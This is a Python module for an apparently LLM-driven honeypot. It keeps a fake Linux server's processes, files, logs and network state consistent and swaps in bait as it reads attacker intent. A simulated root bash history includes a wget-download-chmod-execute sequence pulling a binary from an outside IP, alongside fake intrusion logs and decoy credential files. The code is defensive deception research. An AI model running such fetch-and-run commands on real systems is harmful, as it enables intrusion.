import json
import os
import time
import random

# ============================================================
# VIRTUAL FILESYSTEM STATE DB
# Fixes the find/cat mismatch problem.
# All file content is generated ONCE and stored here.
# find, cat, grep all read from the same source of truth.
# ============================================================

VFS_PERSIST_FILE = "/workspace/honeypot-training/virtual_fs.json"


class VirtualMachineState:
    """
    Centralized state database for a honeypot session.
    Stores:
      - System info
      - Users
      - Processes (with stable PIDs)
      - Services
      - Files (path -> content)
      - Logs
      - Network connections
      - Cron jobs
    """

    def __init__(self, profile_name, profile):
        self.profile_name = profile_name
        self.profile = profile
        self.created_at = time.time()

        # Core state built once at session init
        self.system = self._build_system()
        self.users = self._build_users()
        self.processes = self._build_processes()
        self.services = self._build_services()
        self.files = self._build_files()
        self.network = self._build_network()
        self.cron_jobs = self._build_cron()
        self.logs = self._build_logs()

    # --------------------------------------------------------
    # BUILDERS — called once at init
    # --------------------------------------------------------

    def _build_system(self):
        return {
            "hostname": self.profile["hostname"],
            "os": self.profile["os"],
            "kernel": self.profile["kernel"],
            "ip": self.profile["ip"],
            "mac": self.profile["mac"],
            "arch": "x86_64",
            "uptime_since": "2026-06-01 08:11:04",
            "cpu": "Intel(R) Xeon(R) CPU @ 2.20GHz",
            "cpu_cores": 4,
            "ram_total_mb": 3891,
            "ram_used_mb": 1248,
            "disk_total_gb": 49,
            "disk_used_gb": 12,
        }

    def _build_users(self):
        services = self.profile.get("services", [])
        users = [
            {"name": "root",     "uid": 0,    "gid": 0,    "home": "/root",               "shell": "/bin/bash"},
            {"name": "daemon",   "uid": 1,    "gid": 1,    "home": "/usr/sbin",            "shell": "/usr/sbin/nologin"},
            {"name": "www-data", "uid": 33,   "gid": 33,   "home": "/var/www",             "shell": "/usr/sbin/nologin"},
            {"name": "nobody",   "uid": 65534,"gid": 65534,"home": "/nonexistent",         "shell": "/usr/sbin/nologin"},
            {"name": "sshd",     "uid": 100,  "gid": 65534,"home": "/run/sshd",            "shell": "/usr/sbin/nologin"},
            {"name": "deploy",   "uid": 1000, "gid": 1000, "home": "/home/deploy",         "shell": "/bin/bash"},
            {"name": "app",      "uid": 1001, "gid": 1001, "home": "/home/app",            "shell": "/bin/bash"},
        ]
        if "mysql" in services:
            users.append({"name": "mysql", "uid": 112, "gid": 117, "home": "/nonexistent", "shell": "/bin/false"})
        if "postgres" in services:
            users.append({"name": "postgres", "uid": 113, "gid": 118, "home": "/var/lib/postgresql", "shell": "/bin/bash"})
        if "redis" in services:
            users.append({"name": "redis", "uid": 114, "gid": 119, "home": "/var/lib/redis", "shell": "/usr/sbin/nologin"})
        return users

    def _build_processes(self):
        """
        Build stable process table with FIXED PIDs.
        These PIDs are used consistently across ps aux,
        cat /proc/PID/status, netstat, and all other commands.
        """
        services = self.profile.get("services", [])

        # Fixed PID assignments — never random
        procs = [
            {"pid": 1,    "ppid": 0,   "user": "root",     "cpu": 0.0, "mem": 0.4, "vsz": 168212, "rss": 9232,  "tty": "?", "stat": "Ss", "start": "08:11", "time": "0:02", "cmd": "/sbin/init"},
            {"pid": 2,    "ppid": 0,   "user": "root",     "cpu": 0.0, "mem": 0.0, "vsz": 0,      "rss": 0,     "tty": "?", "stat": "S",  "start": "08:11", "time": "0:00", "cmd": "[kthreadd]"},
            {"pid": 382,  "ppid": 1,   "user": "root",     "cpu": 0.0, "mem": 0.3, "vsz": 48680,  "rss": 6820,  "tty": "?", "stat": "Ss", "start": "08:11", "time": "0:00", "cmd": "/lib/systemd/systemd-journald"},
            {"pid": 742,  "ppid": 1,   "user": "root",     "cpu": 0.0, "mem": 0.3, "vsz": 15436,  "rss": 7120,  "tty": "?", "stat": "Ss", "start": "08:12", "time": "0:00", "cmd": "/usr/sbin/sshd -D"},
        ]

        if "nginx" in services:
            procs += [
                {"pid": 841, "ppid": 1,   "user": "root",     "cpu": 0.0, "mem": 0.2, "vsz": 55240,  "rss": 4300,  "tty": "?", "stat": "Ss", "start": "08:12", "time": "0:00", "cmd": "nginx: master process /usr/sbin/nginx"},
                {"pid": 842, "ppid": 841, "user": "www-data", "cpu": 0.0, "mem": 0.3, "vsz": 55832,  "rss": 6120,  "tty": "?", "stat": "S",  "start": "08:12", "time": "0:00", "cmd": "nginx: worker process"},
                {"pid": 843, "ppid": 841, "user": "www-data", "cpu": 0.0, "mem": 0.3, "vsz": 55832,  "rss": 6048,  "tty": "?", "stat": "S",  "start": "08:12", "time": "0:00", "cmd": "nginx: worker process"},
            ]

        if "apache2" in services:
            procs += [
                {"pid": 841, "ppid": 1,   "user": "root",     "cpu": 0.0, "mem": 0.3, "vsz": 286432, "rss": 7392,  "tty": "?", "stat": "Ss", "start": "08:12", "time": "0:00", "cmd": "/usr/sbin/apache2 -k start"},
                {"pid": 844, "ppid": 841, "user": "www-data", "cpu": 0.0, "mem": 0.4, "vsz": 287120, "rss": 8244,  "tty": "?", "stat": "S",  "start": "08:12", "time": "0:00", "cmd": "/usr/sbin/apache2 -k start"},
            ]

        if "mysql" in services:
            procs.append({"pid": 1021, "ppid": 1, "user": "mysql",    "cpu": 0.1, "mem": 2.4, "vsz": 1274280,"rss": 98220, "tty": "?", "stat": "Sl", "start": "08:12", "time": "0:04", "cmd": "/usr/sbin/mysqld"})

        if "redis" in services:
            procs.append({"pid": 1110, "ppid": 1, "user": "redis",    "cpu": 0.0, "mem": 0.5, "vsz": 64028,  "rss": 10540, "tty": "?", "stat": "Ssl","start": "08:12", "time": "0:01", "cmd": "/usr/bin/redis-server 127.0.0.1:6379"})

        if "node" in services:
            procs.append({"pid": 1290, "ppid": 1, "user": "ubuntu",   "cpu": 0.2, "mem": 1.1, "vsz": 712940, "rss": 44320, "tty": "?", "stat": "Sl", "start": "08:13", "time": "0:06", "cmd": "node server.js"})

        if "flask" in services:
            procs.append({"pid": 1334, "ppid": 1, "user": "ubuntu",   "cpu": 0.1, "mem": 1.0, "vsz": 246224, "rss": 38800, "tty": "?", "stat": "Sl", "start": "08:13", "time": "0:03", "cmd": "python3 app.py"})

        if "postgres" in services:
            procs.append({"pid": 1044, "ppid": 1, "user": "postgres", "cpu": 0.0, "mem": 1.5, "vsz": 219472, "rss": 30212, "tty": "?", "stat": "Ss", "start": "08:12", "time": "0:02", "cmd": "/usr/lib/postgresql/12/bin/postgres"})

        if "ftp" in services:
            procs.append({"pid": 931,  "ppid": 1, "user": "root",     "cpu": 0.0, "mem": 0.1, "vsz": 14752,  "rss": 2820,  "tty": "?", "stat": "Ss", "start": "08:12", "time": "0:00", "cmd": "/usr/sbin/vsftpd /etc/vsftpd.conf"})

        # Current bash session
        procs += [
            {"pid": 1501, "ppid": 1499, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 8892,  "rss": 3340, "tty": "pts/0", "stat": "Ss", "start": "12:40", "time": "0:00", "cmd": "-bash"},
        ]

        return procs

    def _build_services(self):
        """Build service status table."""
        profile_services = self.profile.get("services", [])
        result = {}
        for svc in profile_services:
            pid_map = {
                "nginx": 841, "apache2": 841, "mysql": 1021,
                "redis": 1110, "sshd": 742, "node": 1290,
                "flask": 1334, "postgres": 1044, "ftp": 931,
            }
            result[svc] = {
                "active": True,
                "pid": pid_map.get(svc, 1000),
                "since": "2026-06-01 08:12:04",
                "memory": f"{random.randint(8, 120)}.{random.randint(0,9)}M",
            }
        return result

    def _build_files(self):
        """
        Build virtual filesystem.
        All sensitive files generated ONCE with consistent content.
        find, cat, grep all read from here.
        """
        profile = self.profile
        env = profile.get("env", {})
        webroot = profile.get("webroot", "/var/www/html")

        files = {}

        # .env file — generated once, consistent forever
        env_content = "\n".join(f"{k}={v}" for k, v in env.items())
        files[f"{webroot}/.env"] = env_content
        files["/opt/app/.env"] = env_content
        files["/home/deploy/.env"] = env_content

        # config.php
        db_user = env.get("DB_USERNAME", "app_user")
        db_pass = env.get("DB_PASSWORD", "secure_db_pwd")
        db_name = env.get("DB_DATABASE", "app_prod")
        db_host = env.get("DB_HOST", "127.0.0.1")
        config_php = (
            f"<?php\n"
            f"$DB_HOST = \"{db_host}\";\n"
            f"$DB_NAME = \"{db_name}\";\n"
            f"$DB_USER = \"{db_user}\";\n"
            f"$DB_PASS = \"{db_pass}\";\n\n"
            f"$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);\n"
            f"if (!$conn) {{ die(\"Connection failed\"); }}\n?>"
        )
        files[f"{webroot}/config.php"] = config_php

        # index.php
        files[f"{webroot}/index.php"] = (
            "<?php\nrequire_once 'config.php';\nsession_start();\nheader('Location: /login.php');\n?>"
        )

        # bash history — consistent
        files["/root/.bash_history"] = (
            f"ls -la\ncd {webroot}\ncat .env\nmysql -u {db_user} -p\n"
            f"sudo -l\nwget http://198.51.100.3/d2 -O /tmp/d2\n"
            f"chmod +x /tmp/d2\n/tmp/d2\ncat /etc/passwd\nps aux\nnetstat -tulpn\nrm -f /tmp/d2"
        )

        # SSH authorized_keys
        files["/root/.ssh/authorized_keys"] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... deploy@backup-server"

        return files

    def _build_network(self):
        """Build stable network connection table."""
        ports = self.profile.get("ports", [])
        services = self.profile.get("services", [])
        service_map = {
            22: ("sshd",        742),
            80: ("nginx" if "nginx" in services else "apache2", 841),
            21: ("vsftpd",      931),
            3000: ("node",      1290),
            5000: ("python3",   1334),
            3306: ("mysqld",    1021),
            5432: ("postgres",  1044),
            6379: ("redis-server", 1110),
        }
        connections = []
        for port in ports:
            svc_name, pid = service_map.get(port, ("service", 1000))
            connections.append({
                "proto": "tcp",
                "local_addr": f"0.0.0.0:{port}",
                "foreign_addr": "0.0.0.0:*",
                "state": "LISTEN",
                "pid": pid,
                "program": svc_name,
            })
        return connections

    def _build_cron(self):
        return [
            {"schedule": "*/5 * * * *", "user": "root",   "cmd": "/usr/local/bin/backup.sh > /dev/null 2>&1"},
            {"schedule": "@reboot",      "user": "root",   "cmd": "sleep 30 && /home/ubuntu/start_service.py &"},
            {"schedule": "10 * * * *",  "user": "root",   "cmd": "/usr/bin/tail -n 10 /var/log/nginx/access.log >> /var/log/cron_logs.txt"},
            {"schedule": "@hourly",      "user": "root",   "cmd": "/usr/bin/python3 /opt/monitoring/check_status.py"},
        ]

    def _build_logs(self):
        ip = self.profile.get("ip", "192.168.1.100")
        return {
            "nginx_access": [
                f'192.168.1.44 - - [01/Jun/2026:12:40:02 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0"',
                f'192.168.1.44 - - [01/Jun/2026:12:40:04 +0000] "GET /.env HTTP/1.1" 200 847 "-" "curl/7.81.0"',
                f'198.51.100.3 - - [01/Jun/2026:12:41:12 +0000] "GET /admin HTTP/1.1" 403 162 "-" "Mozilla/5.0"',
                f'198.51.100.3 - - [01/Jun/2026:12:41:20 +0000] "POST /login HTTP/1.1" 302 0 "-" "python-requests/2.31.0"',
                f'203.0.113.10 - - [01/Jun/2026:12:42:01 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 153 "-" "curl/7.68.0"',
            ],
            "auth": [
                f"Jun  1 12:38:21 {self.profile['hostname']} sshd[742]: Failed password for root from 198.51.100.3 port 53122 ssh2",
                f"Jun  1 12:38:27 {self.profile['hostname']} sshd[742]: Accepted password for root from 198.51.100.3 port 53122 ssh2",
                f"Jun  1 12:38:27 {self.profile['hostname']} sshd[742]: pam_unix(sshd:session): session opened for user root",
            ],
        }

    # --------------------------------------------------------
    # QUERY METHODS — used by hard_rules and model prompt
    # --------------------------------------------------------

    def get_file(self, path):
        """Get file content by path. Returns None if not found."""
        return self.files.get(path)

    # --------------------------------------------------------
    # ADAPTIVE DECEPTION — morph the attack surface based on
    # detected attacker intent (Type B deception).
    # --------------------------------------------------------

    def adapt_to_intent(self, intent):
        """
        Change the deception surface in reaction to attacker behavior.
        Returns a list of human-readable changes made (for logging).
        Idempotent: re-applying the same intent doesn't duplicate changes.
        """
        if not hasattr(self, "_deceptions_applied"):
            self._deceptions_applied = set()
        changes = []

        if intent == "Reconnaissance" and "recon_bait" not in self._deceptions_applied:
            # Attacker is scanning → open a tempting "forgotten" dev port
            self.network.append({
                "proto": "tcp", "recvq": 0, "sendq": 0,
                "local_addr": f"0.0.0.0:8080",
                "foreign_addr": "0.0.0.0:*", "state": "LISTEN",
                "pid": 2087, "program": "python3",
            })
            self.processes.append({
                "user": "deploy", "pid": 2087, "ppid": 1, "cpu": 0.1,
                "mem": 0.4, "vsz": 38924, "rss": 18420, "tty": "?",
                "stat": "Sl", "start": "13:05", "time": "0:02",
                "cmd": "/usr/bin/python3 /opt/dev/debug_server.py --port 8080",
            })
            self.services["dev-debug"] = {
                "status": "running", "port": 8080,
                "description": "Werkzeug dev server (DEBUG mode)",
            }
            changes.append("opened port 8080 (fake dev debug server) to bait scanning")
            self._deceptions_applied.add("recon_bait")

        elif intent == "Credential Access" and "cred_bait" not in self._deceptions_applied:
            # Attacker is hunting secrets → reveal a juicier "backup" credential file
            self.files["/var/backups/.env.bak"] = (
                "# BACKUP - rotated credentials\n"
                "DB_HOST=10.0.0.12\n"
                "DB_USERNAME=admin_root\n"
                "DB_PASSWORD=Pr0d!Backup#2024\n"
                "AWS_ACCESS_KEY_ID=AKIA5EXAMPLE7BACKUP\n"
                "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
                "STRIPE_SECRET_KEY=sk_live_51Hb9examplebackupkey\n"
            )
            changes.append("revealed /var/backups/.env.bak with juicier fake secrets")
            self._deceptions_applied.add("cred_bait")

        elif intent == "Privilege Escalation" and "privesc_bait" not in self._deceptions_applied:
            # Attacker probing privesc → present a tempting fake SUID binary
            self.files["/usr/local/bin/backup-helper"] = "\x7fELF (binary)"
            self.processes.append({
                "user": "root", "pid": 2511, "ppid": 1, "cpu": 0.0,
                "mem": 0.1, "vsz": 12044, "rss": 3120, "tty": "?",
                "stat": "Ss", "start": "13:02", "time": "0:00",
                "cmd": "/usr/local/bin/backup-helper --daemon",
            })
            changes.append("presented fake SUID /usr/local/bin/backup-helper for privesc bait")
            self._deceptions_applied.add("privesc_bait")

        elif intent == "Lateral Movement" and "lateral_bait" not in self._deceptions_applied:
            # Attacker scanning network → hint at another reachable host
            self.files["/root/.ssh/known_hosts"] = (
                "10.0.0.20 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmExampleDbServer\n"
                "10.0.0.31 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmExampleBackup\n"
            )
            changes.append("added known_hosts hinting at internal hosts 10.0.0.20/31")
            self._deceptions_applied.add("lateral_bait")

        return changes

    def get_process_by_pid(self, pid):
        """Get process entry by PID. Returns None if not found."""
        for proc in self.processes:
            if proc["pid"] == pid:
                return proc
        return None

    def get_processes_by_name(self, name):
        """Get all processes matching a name pattern."""
        return [p for p in self.processes if name.lower() in p["cmd"].lower()]

    def format_ps_aux(self):
        """Format process table as ps aux output."""
        lines = ["USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND"]
        for p in self.processes:
            lines.append(
                f"{p['user']:<12} {p['pid']:>5} {p['cpu']:>3.1f} {p['mem']:>3.1f} "
                f"{p['vsz']:>6} {p['rss']:>5} {p['tty']:<8} {p['stat']:<4} "
                f"{p['start']:<5} {p['time']:>5} {p['cmd']}"
            )
        # Add ps aux itself
        ps_pid = 1500 + int(time.time()) % 400
        lines.append(
            f"{'root':<12} {ps_pid:>5} {'0.0':>3} {'0.1':>3} "
            f"{'10612':>6} {'3268':>5} {'pts/0':<8} {'R+':<4} "
            f"{time.strftime('%H:%M'):>5} {'0:00':>5} ps aux"
        )
        return "\n".join(lines)

    def format_ps_ef(self):
        """Format process table as ps -ef output."""
        lines = ["UID          PID    PPID  C STIME TTY          TIME CMD"]
        for p in self.processes:
            uid = "root" if p["user"] == "root" else p["user"]
            lines.append(
                f"{uid:<12} {p['pid']:>5} {p['ppid']:>7}  0 {p['start']} "
                f"{p['tty']:<12} {p['time']:>8} {p['cmd']}"
            )
        return "\n".join(lines)

    def format_ps_grep(self, pattern):
        """Format ps aux | grep PATTERN — consistent with process table."""
        matched = []
        header_done = False

        for p in self.processes:
            if pattern.lower() in p["cmd"].lower() or pattern.lower() in p["user"].lower():
                if not header_done:
                    header_done = True
                matched.append(
                    f"{p['user']:<12} {p['pid']:>5} {p['cpu']:>3.1f} {p['mem']:>3.1f} "
                    f"{p['vsz']:>6} {p['rss']:>5} {p['tty']:<8} {p['stat']:<4} "
                    f"{p['start']:<5} {p['time']:>5} {p['cmd']}"
                )

        # Add the grep process itself
        grep_pid = 1500 + int(time.time()) % 400
        matched.append(
            f"{'root':<12} {grep_pid:>5} {'0.0':>3} {'0.0':>3} "
            f"{'6432':>6} {'720':>5} {'pts/0':<8} {'S+':<4} "
            f"{time.strftime('%H:%M'):>5} {'0:00':>5} grep --color=auto {pattern}"
        )

        return "\n".join(matched)

    def format_netstat(self):
        """Format network connections as netstat output."""
        lines = [
            "Active Internet connections (only servers)",
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name",
        ]
        for conn in self.network:
            lines.append(
                f"{conn['proto']:<6}     0      0 {conn['local_addr']:<24} {conn['foreign_addr']:<24} "
                f"{conn['state']:<12} {conn['pid']}/{conn['program']}"
            )
        return "\n".join(lines)

    def format_ss(self):
        """Format network connections as ss output."""
        lines = ["Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port Process"]
        for conn in self.network:
            port = conn["local_addr"].split(":")[-1]
            lines.append(
                f"tcp   LISTEN 0      128          0.0.0.0:{port:<5}      0.0.0.0:*    "
                f'users:(("{conn["program"]}",pid={conn["pid"]},fd=3))'
            )
        return "\n".join(lines)

    def format_proc_status(self, pid):
        """Format /proc/PID/status — consistent with process table."""
        proc = self.get_process_by_pid(pid)
        if not proc:
            return f"cat: /proc/{pid}/status: No such file or directory"

        user_uid = {"root": "0", "www-data": "33", "ubuntu": "1000",
                    "deploy": "1000", "mysql": "112", "redis": "114",
                    "postgres": "113"}.get(proc["user"], "1001")

        return (
            f"Name:\t{proc['cmd'].split()[0].split('/')[-1]}\n"
            f"Umask:\t0022\n"
            f"State:\tS (sleeping)\n"
            f"Tgid:\t{proc['pid']}\n"
            f"Pid:\t{proc['pid']}\n"
            f"PPid:\t{proc['ppid']}\n"
            f"Uid:\t{user_uid}\t{user_uid}\t{user_uid}\t{user_uid}\n"
            f"Gid:\t{user_uid}\t{user_uid}\t{user_uid}\t{user_uid}\n"
            f"VmRSS:\t{proc['rss']:>6} kB\n"
            f"VmSize:\t{proc['vsz']:>6} kB\n"
            f"Threads:\t1\n"
            f"SigBlk:\t0000000000000000\n"
            f"SigIgn:\t0000000000001000"
        )

    def format_crontab(self):
        return "\n".join(f"{c['schedule']} {c['cmd']}" for c in self.cron_jobs)

    def grep_file(self, path, pattern, case_insensitive=False):
        """Grep a file from VFS — guaranteed consistent with cat output."""
        content = self.get_file(path)
        if content is None:
            return f"grep: {path}: No such file or directory"

        matched = []
        for line in content.splitlines():
            check = line.lower() if case_insensitive else line
            pat = pattern.lower() if case_insensitive else pattern
            if pat in check:
                matched.append(line)

        return "\n".join(matched)

    def find_files(self, pattern):
        """Find files in VFS matching a pattern."""
        results = []
        for path in self.files.keys():
            filename = path.rstrip("/").split("/")[-1]
            if pattern == ".env" and filename == ".env":
                results.append(path)
            elif pattern == "config.php" and filename == "config.php":
                results.append(path)
            elif pattern.startswith("*") and filename.endswith(pattern[1:]):
                results.append(path)
            elif pattern.endswith("*") and filename.startswith(pattern[:-1]):
                results.append(path)
        return "\n".join(results)

    def to_model_context(self):
        """
        Generate a compact state summary to inject into the model prompt.
        This is the RAG approach — give the model facts, ask it to format.
        """
        proc_summary = ", ".join(
            f"PID {p['pid']} (PPID {p.get('ppid',1)}, user {p.get('user','root')}) "
            f"{p['cmd'].split()[0].split('/')[-1]}"
            for p in self.processes
            if p["pid"] > 2
        )

        net_summary = ", ".join(
            f"{c['local_addr']} ({c['program']} PID {c.get('pid','?')}) {c.get('state','LISTEN')}"
            for c in self.network
        )

        file_summary = ", ".join(list(self.files.keys())[:8])

        # Fixed service version strings so every command (nmap, sqlmap, nikto,
        # mysql, redis-cli) reports the SAME versions. Without these, each
        # command invents its own version and they contradict each other.
        env = self.profile.get("env", {})
        db_name = env.get("DB_DATABASE", "app_prod")
        db_user = env.get("DB_USERNAME", "app_user")
        # The exact tables the hard-rule "show tables" reports, so model
        # commands (SELECT, sqlmap) reference the SAME tables and don't
        # invent contradictory ones.
        db_tables = ("cache, failed_jobs, jobs, migrations, oauth_access_tokens, "
                     "password_resets, personal_access_tokens, sessions, settings, users")
        # The databases the hard-rule "show databases" reports.
        db_list = f"information_schema, {db_name}, mysql, performance_schema, sys"
        svc = self.profile.get("services", [])
        versions = []
        if "sshd" in svc or True:
            versions.append("OpenSSH 8.9p1 Ubuntu-3ubuntu0.6")
        if "nginx" in svc:
            versions.append("nginx 1.18.0 (Ubuntu)")
        if "apache2" in svc:
            versions.append("Apache 2.4.52 (Ubuntu)")
        if "mysql" in svc:
            versions.append("MySQL 8.0.33-0ubuntu0.22.04.2")
        if "redis" in svc:
            versions.append("Redis 7.0.11")
        if "postgres" in svc:
            versions.append("PostgreSQL 14.9")
        version_summary = ", ".join(versions)

        return (
            f"SYSTEM_STATE:\n"
            f"hostname={self.system['hostname']}\n"
            f"os={self.system['os']}\n"
            f"kernel={self.system['kernel']}\n"
            f"ip={self.system['ip']}\n"
            f"mac={self.system['mac']}\n"
            f"service_versions={version_summary}\n"
            f"database_name={db_name}\n"
            f"database_user={db_user}\n"
            f"all_databases={db_list}\n"
            f"tables_in_{db_name}={db_tables}\n"
            f"processes={proc_summary}\n"
            f"network_connections={net_summary}\n"
            f"known_files={file_summary}\n"
            f"NOTE: For network commands (netstat, ss, ip, ifconfig, arp, route) "
            f"AND process commands (ps aux, ps -ef, cat /proc/PID/status), use "
            f"EXACTLY these PIDs, PPIDs, users, ports, IP and MAC so all outputs "
            f"stay mutually consistent. A /proc/PID/status must match the same PID "
            f"in ps aux.\n"
            f"NOTE: For scanning and database tools (nmap, nikto, sqlmap, mysql, "
            f"redis-cli), use EXACTLY the service_versions, database_name, "
            f"all_databases and table list above. The only application database is "
            f"'{db_name}' and its tables are exactly the ones listed. Do not invent "
            f"other database names, table names, or version numbers, so nmap, "
            f"sqlmap, mysql SELECT and show tables all agree with each other.\n"
        )

    def to_dict(self):
        return {
            "profile_name": self.profile_name,
            "created_at": self.created_at,
            "system": self.system,
            "users": self.users,
            "processes": self.processes,
            "services": self.services,
            "files": self.files,
            "network": self.network,
            "cron_jobs": self.cron_jobs,
            "logs": self.logs,
        }


# ============================================================
# SESSION STATE MANAGER
# One VirtualMachineState per attacker session.
# ============================================================

SESSION_STATES = {}


def get_or_create_state(session_id, profile_name, profile):
    """Get existing state for session or create new one."""
    if session_id not in SESSION_STATES:
        SESSION_STATES[session_id] = VirtualMachineState(profile_name, profile)
        print(f"[VFS] Created new state for session: {session_id} (profile: {profile_name})")
    return SESSION_STATES[session_id]


def get_state(session_id):
    return SESSION_STATES.get(session_id)
